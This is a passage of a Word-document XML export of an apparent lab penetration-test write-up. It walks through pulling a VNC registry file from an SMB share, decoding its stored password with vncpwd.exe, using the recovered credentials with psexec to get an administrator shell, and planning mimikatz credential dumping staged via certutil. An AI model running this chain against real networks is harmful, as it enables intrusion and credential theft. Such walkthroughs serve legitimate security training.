    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRDefault="003A1653" w:rsidP="007E710C">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="407B5703" wp14:editId="56C5ECB9">
            <wp:extent cx="5486400" cy="14528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452880"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1653" w:rsidRPr="003A1653" w:rsidRDefault="003A1653" w:rsidP="003A1653">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the 2 pictures above we use the </w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB" w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>command:</w:t>
      </w:r>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>smbclient</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> //10.10.1.100/Share -U </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>pparker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="003A1653" w:rsidRPr="003A1653" w:rsidRDefault="003A1653">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">And this time we connect to Share folder which called ‘Share’ we connect to this share we </w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>move</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA" w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>and we find the file VNC-Install.reg</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>. L</w:t>
      </w:r>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>s download this file and see what we got there.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRPr="007E710C" w:rsidRDefault="00A57E00" w:rsidP="007E710C">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1306D838" wp14:editId="08A19FC8">
            <wp:extent cx="5486400" cy="5130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513080"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A57E00" w:rsidRDefault="003D55EA" w:rsidP="00A57E00">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidRPr="00A57E00">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">irst </w:t>
      </w:r>
      <w:r w:rsidR="00A57E00" w:rsidRPr="00A57E00">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">we want to download the file VNC-Install.reg from the shared folder to our attacker machine we do this with the command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A57E00" w:rsidRPr="00A57E00">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A57E00" w:rsidRPr="00A57E00">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> * and </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidR="00A57E00" w:rsidRPr="00A57E00">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> will download all the files for us.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A57E00" w:rsidRPr="00A57E00" w:rsidRDefault="00A57E00" w:rsidP="00A57E00">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="604C9A6E" wp14:editId="75CD5F79">
            <wp:extent cx="5486400" cy="5588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5588000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="004A1B95" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>From the picture above after we downloaded the file that we find on the shared folder which called VNC-Install.reg we see there something very interesting: "Password"=hex:6</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>b,cf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,2a,4b,6e,5a,ca,0f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="003D55EA" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="004A1B95" w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">e see password that encrypt in hex now we need </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="004A1B95" w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">find </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="004A1B95" w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">way </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidR="004A1B95" w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> crack this password hex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="004A1B95" w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="004A1B95" w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>et’s check on google what we have.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRPr="008D1FF0" w:rsidRDefault="004A1B95" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="27A171BC" wp14:editId="7794F769">
            <wp:extent cx="5486400" cy="33312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331210"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="004A1B95" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Link to VNC crack password blog:</w:t>
      </w:r>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:rFonts w:hint="cs"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:rtl/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="004A1B95" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>This site from the picture above explain how we can crack hex passwords that encrypt.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="004A1B95" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>There is tool called vncpwd.exe which can help us to crack this password:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="004A1B95" w:rsidP="004A1B95">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>"Password"=hex:6</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>b,cf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,2a,4b,6e,5a,ca,0f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="004A1B95" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Let’s download vncpwd.exe to our kali machine and try to run and hope it will crack the password.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008162AB" w:rsidRPr="0026720B" w:rsidRDefault="004A1B95" w:rsidP="002602ED">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09B31301" wp14:editId="35ECCD34">
            <wp:extent cx="5486400" cy="22009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200910"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="00E7245A" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>It</w:t>
      </w:r>
      <w:r w:rsidR="004A1B95" w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Works! From the picture above we downloaded vncpwd.exe to our kali machine and we run the command: wine vncpwd.exe 6bcf2a4b6e5aca0f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="004A1B95" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>And we Crack the hash(hex) so now we got new credentials</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="004A1B95">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">User: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fcastle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRPr="004A1B95" w:rsidRDefault="004A1B95">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Password: sT333ve2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004A1B95" w:rsidRDefault="004A1B95" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we got credentials let’s try </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004A1B95">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to this user and hope we will got the shell.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="004A1B95">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003D55EA" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003D55EA" w:rsidRDefault="003D55EA" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00944C35" w:rsidRDefault="00247098" w:rsidP="00944C35">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>PSEXEC.py</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA" w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>(With The Second User)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75D3283F" wp14:editId="40BBEAB4">
            <wp:extent cx="5486400" cy="39262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926205"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00247098" w:rsidRDefault="00E7245A" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>It</w:t>
      </w:r>
      <w:r w:rsidR="00247098" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Work! We got shell on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00247098" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fcastle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00247098" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> machine and this time </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidR="00247098" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> works we got shell. This time </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidR="00247098" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> works because </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00247098" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fcastle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00247098" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> have local administrator on this machine this is why we can </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00247098" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00247098" w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> into the machine and got the shell.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now next step is to running </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mimikatz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00247098">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> on this machine and hope we will got the administrator hash of all the domain.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003D55EA" w:rsidRDefault="003D55EA" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003D55EA" w:rsidRDefault="003D55EA" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00247098" w:rsidRPr="00944C35" w:rsidRDefault="00247098" w:rsidP="00247098">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Download </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Mimikatz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>To</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> Target Machine Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Certutil</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
